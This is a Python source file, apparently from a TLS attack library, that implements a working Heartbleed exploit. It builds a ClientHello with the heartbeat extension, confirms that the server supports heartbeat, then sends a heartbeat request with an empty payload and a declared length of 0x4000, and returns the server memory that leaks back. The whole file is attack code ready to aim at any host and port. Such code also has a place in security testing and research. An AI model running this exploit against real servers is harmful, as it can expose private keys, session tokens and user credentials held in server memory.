import logging
import socket
import time
import os

from tls_attack.structure.TLSHeader import *
from tls_attack.structure.TLSHandshake import *
from tls_attack.structure.TLSHeartbeat import *
from tls_attack.structure.TLSState import *
from tls_attack.structure.TLSSource import *
from tls_attack.structure.TLSExtension import *
from tls_attack.structure.TLSClientHello import *
from tls_attack.structure.TLSCipherSuiteStruct import *
from tls_attack.structure.TLSCompressionStruct import *

class HeartbleedAttack:
    def __init__(self, server_addr, port = 443):
        self.server_addr = server_addr
        self.port = port

    def leak_data(self):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((self.server_addr, self.port))

        state = TLSState()

        client_hello = self._get_client_hello(state, TLSSource.CLIENT)
        connection.sendall(client_hello.encode(state, TLSSource.CLIENT))

        logging.info("Sending client hello : " + str(client_hello))

        # Waiting for the server hello response
        while True:
            server_hello = self._get_next_structure(connection, state, TLSSource.SERVER)

            if type(server_hello.body) is TLSHandshake and type(server_hello.body.body) is TLSServerHello:
                break

        # We make sure the server supports and activated the heartbeat extensions 
        heartbeat_supported = False
        for extension in server_hello.body.body.extensions:
            if extension.extension_type == TLSExtensionType.HEARTBEAT:
                heartbeat_supported = True
                break

        if not heartbeat_supported:
            logging.error("Server '%s:%s' doesn't support the heartbeat extensions. Unable to heartbleed." % (self.server_addr, self.port))
            return b""

        heartbeat = self._get_heartbeat(state, TLSSource.CLIENT)
        connection.sendall(heartbeat.encode(state, TLSSource.CLIENT))

        logging.info("Sending heartbeat : " + str(heartbeat))

        # Waiting for the heartbeat response
        while True:
            heartbeat_response = self._get_next_structure(connection, state, TLSSource.SERVER)

            if type(heartbeat_response.body) is TLSHeartbeat:
                return heartbeat_response.body.payload

    def _get_next_structure(self, connection, state, source):
        buf = b""

        while True:
            buf += connection.recv(1)
            header = TLSHeader()
            
            if not header.decode(buf, state, source) == 0:
                break

        return header

    def _get_heartbeat(self, state, source):
        heartbeat = TLSHeartbeat()
        heartbeat.heartbeat_type = TLSHeartbeatMessageType.HEARTBEAT_REQUEST
        heartbeat.length = 0x4000
        heartbeat.payload = b""
        heartbeat.padding = b""

        header = TLSHeader()
        header.content_type = TLSContentType.TLSHeartbeat.value
        header.version = TLSVersion.TLS10.value
        header.body = heartbeat
        header.length = len(heartbeat.encode(state, source))

        return header

    def _get_client_hello(self, state, source):
        # Initial message has to be a ClientHello
        handshake = TLSHandshake()
        handshake.handshake_type = TLSHandshakeType.TLSClientHello.value

        handshake.body = TLSClientHello()
        handshake.body.version = TLSVersion.TLS10.value
        handshake.body.gmt_unix_timestamp = int(time.time())
        handshake.body.random_bytes = os.urandom(28)

        ## Session
        handshake.body.session_id_length = 0
        handshake.body.session_id = b""

        ## Cipher suites
        handshake.body.cipher_suites = self._get_cipher_suites()
        handshake.body.cipher_suites_length = 2 * len(handshake.body.cipher_suites)

        ## Compression params
        handshake.body.compression_methods = []
        handshake.body.compression_methods.append(TLSCompressionStruct())
        handshake.body.compression_methods[0].compression_method = TLSCompression.NULL
        handshake.body.compression_methods_length = 1

        ## Extensions
        handshake.body.extensions = []
        handshake.body.extensions_length = 0

        handshake.body.extensions.append(TLSExtension())
        handshake.body.extensions[0].extension_type = TLSExtensionType.EC_POINT_FORMATS
        handshake.body.extensions[0].extension_data = b"\x03\x00\x01\x02"
        handshake.body.extensions[0].extension_data_length = 4
        handshake.body.extensions_length += len(handshake.body.extensions[0].encode(state, source))

        handshake.body.extensions.append(TLSExtension())
        handshake.body.extensions[1].extension_type = TLSExtensionType.ELLIPTIC_CURVES
        handshake.body.extensions[1].extension_data = b"\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11"
        handshake.body.extensions[1].extension_data_length = 52
        handshake.body.extensions_length += len(handshake.body.extensions[1].encode(state, source))

        handshake.body.extensions.append(TLSExtension())
        handshake.body.extensions[2].extension_type = TLSExtensionType.SESSION_TICKET_TLS
        handshake.body.extensions[2].extension_data = b""
        handshake.body.extensions[2].extension_data_length = 0
        handshake.body.extensions_length += len(handshake.body.extensions[2].encode(state, source))	

        handshake.body.extensions.append(TLSExtension())
        handshake.body.extensions[3].extension_type = TLSExtensionType.HEARTBEAT
        handshake.body.extensions[3].extension_data = b"\x01"
        handshake.body.extensions[3].extension_data_length = 1 
        handshake.body.extensions_length += len(handshake.body.extensions[3].encode(state, source))

        handshake.length = len(handshake.body.encode(state, source))

        header = TLSHeader()
        header.content_type = TLSContentType.TLSHandshake.value
        header.version = TLSVersion.TLS10.value
        header.body = handshake
        header.length = len(handshake.encode(state, source))

        return header

    def _get_cipher_suites(self):
        list_cipher = [
            TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, 
            TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
            TLSCipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,
            TLSCipherSuite.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,
            TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384,
            TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
            TLSCipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA256,
            TLSCipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
            TLSCipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA,
            TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
            TLSCipherSuite.TLS_RSA_WITH_3DES_EDE_CBC_SHA
        ]
        result = []

        for cipher in list_cipher:
            struct = TLSCipherSuiteStruct()
            struct.cipher_suite = cipher
            result.append(struct)

        return result

